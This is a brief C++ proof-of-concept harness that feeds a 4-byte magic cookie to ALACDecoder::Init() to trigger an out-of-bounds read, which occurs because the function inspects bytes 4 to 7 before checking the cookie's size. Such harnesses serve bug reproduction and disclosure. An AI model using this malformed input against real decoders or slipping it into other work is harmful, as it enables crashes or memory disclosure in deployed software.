// PoC harness: ALACDecoder::Init() magic cookie OOB read (no size check before [4..7])
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdint.h>
#include "ALACDecoder.h"
int main() {
    // tiny 4-byte cookie: Init() reads theActualCookie[4..7] for 'frma'/'alac'
    // atom sniffing BEFORE checking theCookieBytesRemaining >= 24
    uint8_t cookie[4] = { 0, 0, 0, 1 };
    ALACDecoder dec;
    int r = dec.Init(cookie, sizeof(cookie));
    printf("Init returned %d\n", r);
    return 0;
}
